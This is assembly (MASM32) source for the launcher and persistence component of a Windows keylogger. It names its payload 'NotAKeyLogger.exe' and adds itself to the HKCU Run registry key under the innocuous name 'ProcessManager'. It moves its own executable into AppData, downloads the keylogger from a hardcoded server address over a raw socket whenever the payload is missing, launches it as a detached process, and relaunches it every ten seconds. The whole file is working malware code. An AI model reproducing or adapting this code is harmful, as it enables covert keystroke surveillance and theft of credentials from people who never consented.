include D:\masm32\include\masm32rt.inc
include D:\masm32\include\ws2_32.inc
includelib D:\masm32\lib\ws2_32.lib

LaunchLogger PROTO
WinMain PROTO 
CompareStrings PROTO :DWORD, :DWORD
Process32Next PROTO :DWORD, :DWORD
Process32First PROTO :DWORD, :DWORD
FillSocketAddress PROTO : DWORD
CreateSocket PROTO
ConnectSocket PROTO : DWORD
CleanSocket PROTO
ReceiveFileFromServer PROTO
ReceiveFileThroughSocket PROTO :SOCKET
CreateRegistryKey PROTO														 
MoveExecutableFileToOtherLocation PROTO
SetPathLocationsForFiles PROTO
WriteByteByByteToBuffer PROTO :DWORD, :DWORD, :DWORD
GetStringLength PROTO :DWORD

.DATA
locationFirstPart db 'C:\Users\', 0 
monitorLocationSecondPart db '\AppData\Local\KeyloggerMonitor.exe', 0
keyloggerLocationSecondPart db '\AppData\Local\NotAKeyLogger.exe', 0
processName db 'NotAKeyLogger.exe', 0
valueName db 'ProcessManager', 0
autoKey db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
launchedProcessInfo PROCESS_INFORMATION <>																;struct

.DATA?
userName db 32 dup (?)
monitorLocation db 100 dup (?)
keyloggerLocation db 100 dup (?)
hInstance dd ?
fileLocationBuffer db 1000 dup(?)
fileDescriptor HANDLE ?

.CODE
MAIN:

			call				SetPathLocationsForFiles
			call				LaunchLogger 
			call				CreateRegistryKey
			call				MoveExecutableFileToOtherLocation
			call				WinMain
			INVOKE			ExitProcess, 0																					;not needed, but just in case

;*****************Stay As Background Process**************************
WinMain PROC 
LOCAL hProcessSnap:HANDLE 
LOCAL process:PROCESSENTRY32
LOCAL exitCode:DWORD

			INVOKE			CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0							;snapshot of all running processes
			mov				hProcessSnap, eax
			mov				process.dwSize, SIZEOF process
			INVOKE			Process32First, hProcessSnap, ADDR process										;check if something exists in snapshot
			test				eax, eax
			je					MessagePump	

LoopOverProc:	
			INVOKE			Process32Next, hProcessSnap, ADDR process
			cmp				eax, ERROR_SUCCESS																		;end of enumeration, nothing was found
			je					LaunchExe																							
			cmp				eax, ERROR_NO_MORE_FILES																;same as above, but it is unclear from 
			je					LaunchExe
			INVOKE			CompareStrings, ADDR processName, ADDR process.szExeFile
			test				eax, eax
			jnz				MessagePump																					;our proc returned eax as 1 (equals)
			jmp				LoopOverProc		
																				
LaunchExe:		
			call				LaunchLogger

MessagePump:																													;loop to keep alive	
			INVOKE			GetExitCodeProcess, launchedProcessInfo.hProcess, ADDR exitCode		;check if logger is running
			cmp				exitCode, STILL_ACTIVE
			je					SleepTime																					
			call				LaunchLogger

SleepTime:				
			INVOKE			Sleep, 10000																						;sleep to prevent perfomance overhead due to constant process checks
			jmp				MessagePump
			ret
WinMain ENDP

;*******************Launch Main Key Logger*********************************
LaunchLogger PROC
LOCAL startInfo:STARTUPINFO

LaunchExe:
			INVOKE			GetStartupInfo, ADDR startInfo
			INVOKE			CreateProcess, ADDR keyloggerLocation, 0, 0, 0, FALSE,
														DETACHED_PROCESS, 0, 0,
														ADDR startInfo, ADDR launchedProcessInfo
			test				eax, eax
			jne				Exit
			call				GetLastError
			cmp				eax, ERROR_FILE_NOT_FOUND															;if exe is missing (first launch for example)
			je					DownloadFile
			cmp				eax, ERROR_BAD_EXE_FORMAT
			je					DownloadFile
			cmp				eax, ERROR_FILE_CORRUPT
			je					DownloadFile
			jmp				Exit

DownloadFile:	
			call				ReceiveFileFromServer
			jmp				LaunchExe
Exit:
			ret

LaunchLogger ENDP

;**************Create Registry Key For Self Startup************************
CreateRegistryKey PROC
LOCAL			hKey:DWORD 
						
			INVOKE			RegCreateKeyEx, HKEY_CURRENT_USER, ADDR autoKey, 0, 0, 0, KEY_ALL_ACCESS, 0, ADDR hKey, 0
			INVOKE			lstrlen, ADDR monitorLocation
			INVOKE			RegSetValueEx, hKey, ADDR valueName, 0, REG_SZ, ADDR monitorLocation, eax
			mov				eax, 1
			ret				

CreateRegistryKey ENDP																		 

;***************Get EXE Location And Move To Other Directory***************
MoveExecutableFileToOtherLocation PROC

			INVOKE			GetModuleFileName, hInstance, OFFSET fileLocationBuffer, MAX_PATH
			INVOKE			MoveFile, ADDR fileLocationBuffer, ADDR monitorLocation
			ret

MoveExecutableFileToOtherLocation ENDP

;*******************Compare Strings***************************************
CompareStrings PROC string1:DWORD, string2:DWORD

			xor				eax, eax
			mov				esi, [string2]
			mov				edi, [string1]
			mov				ecx, 18				;size of "NotAKeyLogger.exe" string
			repz				cmpsb
			jnz				Exit
			jz					Equal
Equal:				
			inc				eax
Exit:
			ret

CompareStrings ENDP

;**********************Sets Paths For Key Files, That Are Used By Program*****
SetPathLocationsForFiles PROC

			push				32
			mov				esi, esp
			INVOKE			GetUserName, ADDR userName, esi
			pop				ecx
			INVOKE			WriteByteByByteToBuffer, ADDR locationFirstPart, ADDR userName, ADDR monitorLocation										;C:\Users\ + username
			INVOKE			WriteByteByByteToBuffer, ADDR monitorLocation, ADDR monitorLocationSecondPart, ADDR monitorLocation				;previous + \AppData\Local\KeyLoggerMonitor.exe
			INVOKE			WriteByteByByteToBuffer, ADDR locationFirstPart, ADDR userName, ADDR keyloggerLocation									;C:\Users\ + username
			INVOKE			WriteByteByByteToBuffer, ADDR keyloggerLocation, ADDR keyloggerLocationSecondPart, ADDR keyloggerLocation		;previous + \AppData\Local\NotAKeyLogger.exe
			ret
						
SetPathLocationsForFiles ENDP

;***********Concats Two String Into One And Writes Result To Buffer***************
WriteByteByByteToBuffer PROC firstPart:DWORD, secondPart:DWORD, buffer:DWORD

			INVOKE			GetStringLength, firstPart		;length of first string
			mov				ebx, ecx 
			mov				esi, firstPart							;pointer to first part
			mov				edi, buffer								;pointer to buffer«
Loop1:
			mov				al, BYTE PTR [esi + ecx]			;taking last char from end of  string
			mov				BYTE PTR [edi + ecx], al			;moving that char to the end of buffer
			dec				ecx
			cmp				ecx, 0FFFFFFFFh						;if less than 0
			jne				Loop1
NextStep:
			push				edi
			INVOKE			GetStringLength, secondPart   ;length of second string
			pop				edi
			add				ebx, ecx								;length of buffer with two strings»»»
			mov				esi, secondPart						;pointer to second part
Loop2:
			mov				al, BYTE PTR [esi + ecx]			;taking last char from end of string
			mov				BYTE PTR [edi + ebx], al			;moving that char to the end of buffer, which already contains first part
			dec				ebx										;decrease counter and repeat
			dec				ecx
			cmp				ecx, 0FFFFFFFFh						;if less than 0
			jne				Loop2
Exit:
			ret

WriteByteByByteToBuffer ENDP

;***************Get Exact Length Of String**********************************
GetStringLength PROC stringAddr:DWORD

		mov				edi, stringAddr					;text to get length from
		xor				eax, eax						    ;contains value to compare with
		or					ecx, 0FFFFFFFFh				    ;getting max value
		cld													    ;cls dir flag
		repne scasb									        ;repeat scan string (decreases ecx)
		not				ecx								    ;+ to -
		add				ecx, 0FFFFFFFFh				    ;getting count as normal positive number		
		ret

GetStringLength ENDP

;*******************Create Launchable .exe****************************
CreateExe PROC

		INVOKE			CreateFile, ADDR keyloggerLocation, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
		mov				fileDescriptor, eax
		ret

CreateExe ENDP

;**************Receives .exe File From Server************************************
ReceiveFileFromServer PROC
LOCAL				sockAddr:sockaddr_in
LOCAL			    wsaData:WSADATA
REQ_WINSOCK_VER equ 2

		INVOKE			   WSAStartup, REQ_WINSOCK_VER, ADDR wsaData								  ;setting "behind scene" stuff for winsocks 
		test				   eax, eax
		jnz				   Exit
		cmp				   BYTE PTR [wsaData.wVersion], REQ_WINSOCK_VER							  ;if major version (low byte) is at least REQ_WINSOCK_VER
		jb					   Exit
		INVOKE			   FillSocketAddress, ADDR sockAddr
		INVOKE			   CreateSocket
		cmp				   eax, INVALID_SOCKET
		je					   Exit
		mov				   edx, SIZEOF sockAddr
		INVOKE			   ConnectSocket, ADDR sockAddr
		test				   eax, eax
		jne				   Exit
		mov					esi, ebx
		INVOKE			   ReceiveFileThroughSocket, ebx
Exit:					
		INVOKE			   CleanSocket
		ret
						
ReceiveFileFromServer ENDP

;******************************************************************
;****************SOCKET SECTION************************************
;******************************************************************

;***************Fill Address Info**************************************
FillSocketAddress PROC sockAddr:DWORD

		mov					eax, 3232258095						;ip 192.168.88.47 (or whatever private/public u have)
		bswap				eax											;to net order

		mov					ecx, 1beah									;port 7146 (or whatever u have)
		xchg					cl, ch											;to net order

		mov					edx, [sockAddr]
		mov					[edx][sockaddr_in.sin_family], AF_INET
		mov					[edx][sockaddr_in.sin_port], cx
		mov					[edx][sockaddr_in.sin_addr.S_un.S_addr], eax
		ret

FillSocketAddress ENDP

;****************Create Socket***************************************
CreateSocket PROC

		INVOKE				socket, AF_INET, SOCK_STREAM, IPPROTO_TCP
		mov					ebx, eax
		ret

CreateSocket ENDP

;*************Connect Socket****************************************
ConnectSocket PROC sockAddr:DWORD
LOCAL			socketDescriptor:DWORD
LOCAL			sizeOfAddrStruct:DWORD
	
		mov					[socketDescriptor], ebx			;reg overwritten after connect
		mov					[sizeOfAddrStruct], edx			;reg overwritten after connect
		mov					edi, 5									;max try count = 5

Connect:
		INVOKE				connect, socketDescriptor, sockAddr, sizeOfAddrStruct
		test					eax, eax
		jz						Exit

CheckErrors:
		call					GetLastError
		cmp					eax, WSAENETUNREACH			;unreachable (mostly because of no internet connection)
		je						TryAgainAfterAWhile

CanErrorBeIgnored:
		cmp					eax, WSAEISCONN					;connection is made on existing one
		je						ResetError
		cmp					eax, WSA_IO_PENDING			;operation in process/pending
		je						WaitBeforeContinuing
		cmp					eax, WSAEADDRINUSE			;address in use
		je						ResetError

TryAgainAfterAWhile:
		INVOKE				Sleep, 10000							;sleep for 10 seconds before trying again
		dec					edi
		test					edi, edi			
		jnz					Connect
		jmp					Exit

WaitBeforeContinuing:
		INVOKE				Sleep, 10000

ResetError:		
		xor					eax, eax

Exit:					
		ret

ConnectSocket ENDP

;************Receives File Through Socket************************************  
ReceiveFileThroughSocket PROC  socketDescriptor:SOCKET
LOCAL			bytesRed:DWORD
LOCAL			bytesToRead:DWORD

Download:
		INVOKE				CreateExe
		mov					bytesToRead, 64000d				;64kb max, exe size is 18kb
		INVOKE				VirtualAlloc, 0, bytesToRead, MEM_COMMIT, PAGE_READWRITE
		mov					esi, eax

ReceiveFile:
		INVOKE				recv, socketDescriptor, esi, bytesToRead, 0
		test					eax, eax
		jz						Exit
		mov					ebx, eax
		INVOKE				WriteFile, fileDescriptor, esi, ebx, ADDR bytesRed, 0
		test					eax, eax
		jz						Exit
		cmp					bytesToRead, 0
		jne					ReceiveFile

Exit:
		INVOKE				CloseHandle, fileDescriptor
		INVOKE			    VirtualFree, esi, 0, 0
		mov					ebx, socketDescriptor
		ret				

ReceiveFileThroughSocket ENDP

;***********Socket Post-Cleanup*************************************
CleanSocket PROC

		cmp					ebx, INVALID_SOCKET
		je						Clean										;skip close if socket was not created

Close:		
		INVOKE				closesocket, ebx

Clean:				
		INVOKE				WSACleanup
		xor					ebx, ebx
		ret

CleanSocket ENDP

;**********************END**********************************************
END MAIN